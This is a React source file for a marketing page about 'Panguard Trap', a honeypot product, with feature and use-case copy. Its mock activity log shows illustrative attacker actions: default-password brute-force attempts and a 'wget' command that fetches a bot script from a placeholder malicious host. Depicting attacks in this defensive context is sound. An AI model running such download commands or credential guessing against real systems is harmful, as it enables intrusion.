"use client";

import FadeInUp from "@/components/FadeInUp";
import SectionWrapper from "@/components/ui/SectionWrapper";
import SectionTitle from "@/components/ui/SectionTitle";
import Link from "next/link";
import { ArrowRight } from "lucide-react";
import {
  NetworkIcon, ScanIcon, GlobalIcon,
  SettingsIcon, ShieldIcon, TerminalIcon, TeamIcon, EnterpriseIcon,
} from "@/components/ui/BrandIcons";

/* ─── Features ─── */
const features = [
  {
    icon: NetworkIcon,
    title: "Auto-Deployed Honeypots",
    description:
      "Panguard Trap automatically deploys realistic decoy services on unused ports. Fake SSH servers, simulated databases, and mock admin panels that look real to attackers but are designed to capture their every move.",
  },
  {
    icon: ScanIcon,
    title: "Attacker Profiling",
    description:
      "Every interaction with a honeypot is logged in detail: tools used, commands executed, files uploaded, lateral movement attempts. Panguard builds a profile of the attacker's techniques, tactics, and procedures (TTPs).",
  },
  {
    icon: GlobalIcon,
    title: "Threat Intelligence Contribution",
    description:
      "Attack patterns captured by your traps are anonymized and contributed to the Panguard collective intelligence network. Your honeypot data helps protect every other Panguard user -- and theirs protects you.",
  },
  {
    icon: SettingsIcon,
    title: "AI-Powered Analysis",
    description:
      "Captured attacker sessions are analyzed by Panguard's AI to classify attack types, estimate sophistication levels, and identify whether the attacker is an automated scanner or a human operator.",
  },
  {
    icon: NetworkIcon,
    title: "Adaptive Deployment",
    description:
      "Honeypots adapt to your environment. If Panguard detects that attackers are probing specific services, it dynamically deploys decoys that mimic those services to gather more targeted intelligence.",
  },
  {
    icon: ShieldIcon,
    title: "Zero Risk to Production",
    description:
      "Honeypots are completely isolated from your production environment. They run in sandboxed containers with no access to real data, real services, or real network segments. Attackers waste their time on decoys.",
  },
];

/* ─── Use Cases ─── */
const useCases = [
  {
    icon: TerminalIcon,
    title: "Threat Researcher",
    description:
      "You want to understand what attackers are doing to systems like yours. Deploy Panguard Trap and receive detailed reports on attacker behavior, tools, and techniques. Use the intelligence to harden your real systems.",
  },
  {
    icon: TeamIcon,
    title: "Security Team",
    description:
      "Your team uses honeypot data to train detection models and validate security controls. Panguard Trap provides a continuous stream of real attacker behavior that is far more valuable than synthetic test data.",
  },
  {
    icon: EnterpriseIcon,
    title: "Compliance Requirement",
    description:
      "Some compliance frameworks require active threat detection beyond passive monitoring. Honeypots demonstrate proactive security posture to auditors and provide evidence of continuous threat awareness.",
  },
];

export default function ProductTrapContent() {
  return (
    <>
      {/* ── Hero ── */}
      <section className="relative min-h-[50vh] flex items-center px-6 lg:px-[120px] py-24 border-b border-border overflow-hidden">
        <div className="absolute top-1/3 left-1/2 -translate-x-1/2 w-[700px] h-[400px] bg-brand-sage/5 rounded-full blur-[200px] pointer-events-none" />
        <div className="max-w-[1200px] mx-auto relative text-center w-full">
          <FadeInUp>
            <div className="relative w-20 h-20 mx-auto mb-4 flex items-center justify-center">
              <div className="absolute inset-0 rounded-full border border-brand-sage/20 animate-[spin_12s_linear_infinite]" />
              <div className="absolute inset-2 rounded-full border border-brand-sage/10 animate-[spin_8s_linear_infinite_reverse]" />
              <NetworkIcon className="w-10 h-10 text-brand-sage relative" />
            </div>
          </FadeInUp>
          <FadeInUp delay={0.05}>
            <p className="text-[11px] uppercase tracking-[0.15em] text-brand-sage font-semibold mb-4">
              Panguard Trap
            </p>
            <h1 className="text-[clamp(36px,4.5vw,56px)] font-extrabold leading-[1.08] tracking-tight text-text-primary max-w-3xl mx-auto">
              Intelligent honeypots.{" "}
              <span className="text-brand-sage">Know your attackers.</span>
            </h1>
          </FadeInUp>
          <FadeInUp delay={0.1}>
            <p className="text-xl text-text-secondary max-w-xl mx-auto mt-6 leading-relaxed">
              Turn the tables. Let attackers reveal themselves while your real
              systems stay protected.
            </p>
          </FadeInUp>
        </div>
      </section>

      {/* ── Pain Point ── */}
      <SectionWrapper>
        <div className="max-w-3xl mx-auto">
          <FadeInUp>
            <p className="text-[11px] uppercase tracking-[0.12em] text-brand-sage font-semibold mb-4">
              The Problem
            </p>
            <h2 className="text-[clamp(28px,3vw,40px)] font-bold text-text-primary leading-[1.1]">
              Defensive security is reactive. You are always one step behind.
            </h2>
          </FadeInUp>
          <FadeInUp delay={0.1}>
            <p className="text-text-secondary mt-5 leading-relaxed">
              Traditional security waits for attackers to hit your real systems
              before responding. By then, you are already at a disadvantage. You
              do not know what tools they are using, what they are looking for,
              or how sophisticated they are. You are defending blind.
            </p>
            <p className="text-text-secondary mt-4 leading-relaxed">
              Panguard Trap flips the script. It deploys realistic decoy
              services that attract attackers and capture their every move. While
              they waste time on fake targets, you gather intelligence that makes
              your real defenses stronger. The attacker becomes the informant.
            </p>
          </FadeInUp>
        </div>
      </SectionWrapper>

      {/* ── How It Works Mockup ── */}
      <SectionWrapper dark>
        <div className="grid lg:grid-cols-2 gap-12 items-center">
          <div>
            <FadeInUp>
              <p className="text-[11px] uppercase tracking-[0.12em] text-brand-sage font-semibold mb-4">
                How It Works
              </p>
              <h2 className="text-[clamp(28px,3vw,40px)] font-bold text-text-primary leading-[1.1]">
                Attract. Observe. Learn.
              </h2>
            </FadeInUp>
            <FadeInUp delay={0.1}>
              <div className="space-y-4 mt-6">
                {[
                  { step: "01", label: "Deploy", desc: "Panguard Trap identifies unused ports and deploys realistic decoy services automatically." },
                  { step: "02", label: "Attract", desc: "Attackers scanning your network discover the honeypots and interact with them, thinking they are real." },
                  { step: "03", label: "Capture", desc: "Every command, file upload, and lateral movement attempt is recorded in a sandboxed environment." },
                  { step: "04", label: "Analyze", desc: "AI classifies the attack, profiles the attacker, and extracts indicators of compromise (IOCs)." },
                  { step: "05", label: "Share", desc: "Anonymized threat intelligence is pushed to the collective network, strengthening every Panguard user." },
                ].map((item) => (
                  <div key={item.step} className="flex gap-4 items-start">
                    <span className="text-xs font-bold text-brand-sage font-mono shrink-0 w-6">
                      {item.step}
                    </span>
                    <div>
                      <p className="text-sm font-semibold text-text-primary">
                        {item.label}
                      </p>
                      <p className="text-xs text-text-tertiary mt-0.5">
                        {item.desc}
                      </p>
                    </div>
                  </div>
                ))}
              </div>
            </FadeInUp>
          </div>
          <FadeInUp delay={0.15}>
            <div className="bg-surface-2 rounded-xl border border-border overflow-hidden">
              <div className="bg-surface-3 px-4 py-3 border-b border-border">
                <span className="text-sm font-semibold text-text-primary">
                  Trap Activity Log
                </span>
              </div>
              <div className="p-4 font-mono text-xs space-y-2">
                {[
                  { time: "03:12:41", text: "Honeypot SSH (port 2222) connection from 185.220.xx.xx", color: "text-[#f59e0b]" },
                  { time: "03:12:43", text: "Brute-force attempt: root/admin123", color: "text-[#ef4444]" },
                  { time: "03:12:44", text: "Brute-force attempt: root/password", color: "text-[#ef4444]" },
                  { time: "03:12:47", text: "Login succeeded (honeypot credentials)", color: "text-[#f59e0b]" },
                  { time: "03:12:49", text: "Command: uname -a", color: "text-text-secondary" },
                  { time: "03:12:51", text: "Command: wget http://malicious.xx/bot.sh", color: "text-[#ef4444]" },
                  { time: "03:12:52", text: "File captured: bot.sh (SHA256: 8a3f...)", color: "text-[#22c55e]" },
                  { time: "03:12:55", text: "Attacker profile: automated scanner, low sophistication", color: "text-brand-sage" },
                  { time: "03:12:56", text: "IOC submitted to collective intelligence", color: "text-brand-sage" },
                ].map((line, i) => (
                  <div key={i} className="flex gap-3">
                    <span className="text-text-muted shrink-0">{line.time}</span>
                    <span className={line.color}>{line.text}</span>
                  </div>
                ))}
              </div>
            </div>
          </FadeInUp>
        </div>
      </SectionWrapper>

      {/* ── Features ── */}
      <SectionWrapper>
        <SectionTitle
          overline="Features"
          title="What Panguard Trap does."
          subtitle="Proactive threat intelligence that makes your defenses smarter every day."
        />
        <div className="grid sm:grid-cols-2 lg:grid-cols-3 gap-4 mt-14">
          {features.map((f, i) => (
            <FadeInUp key={f.title} delay={i * 0.08}>
              <div className="bg-surface-1 rounded-xl border border-border p-6 h-full card-glow">
                <f.icon className="w-5 h-5 text-brand-sage mb-4" />
                <p className="text-sm font-bold text-text-primary mb-2">
                  {f.title}
                </p>
                <p className="text-xs text-text-secondary leading-relaxed">
                  {f.description}
                </p>
              </div>
            </FadeInUp>
          ))}
        </div>
      </SectionWrapper>

      {/* ── Use Cases ── */}
      <SectionWrapper dark>
        <SectionTitle
          overline="Use Cases"
          title="Who uses Panguard Trap."
        />
        <div className="grid sm:grid-cols-3 gap-6 mt-14">
          {useCases.map((uc, i) => (
            <FadeInUp key={uc.title} delay={i * 0.1}>
              <div className="bg-surface-2 rounded-xl border border-border p-6 h-full card-glow">
                <uc.icon className="w-6 h-6 text-brand-sage mb-4" />
                <p className="text-sm font-bold text-text-primary mb-2">
                  {uc.title}
                </p>
                <p className="text-xs text-text-secondary leading-relaxed">
                  {uc.description}
                </p>
              </div>
            </FadeInUp>
          ))}
        </div>
      </SectionWrapper>

      {/* ── CTA ── */}
      <SectionWrapper>
        <div className="text-center">
          <FadeInUp>
            <h2 className="text-[clamp(28px,3vw,40px)] font-bold text-text-primary">
              Stop guessing. Start knowing.
            </h2>
            <p className="text-text-secondary mt-3 max-w-lg mx-auto">
              Deploy intelligent honeypots and turn attacker activity into
              actionable intelligence.
            </p>
          </FadeInUp>
          <FadeInUp delay={0.1}>
            <div className="flex flex-wrap justify-center gap-3 mt-8">
              <Link
                href="/early-access"
                className="inline-flex items-center gap-2 bg-brand-sage text-surface-0 font-semibold rounded-full px-8 py-3.5 hover:bg-brand-sage-light transition-all duration-200 active:scale-[0.98]"
              >
                Get Early Access <ArrowRight className="w-4 h-4" />
              </Link>
              <Link
                href="/product/guard"
                className="border border-border text-text-secondary hover:text-text-primary hover:border-brand-sage font-semibold rounded-full px-8 py-3.5 transition-all duration-200"
              >
                Learn About Guard
              </Link>
            </div>
          </FadeInUp>
        </div>
      </SectionWrapper>
    </>
  );
}
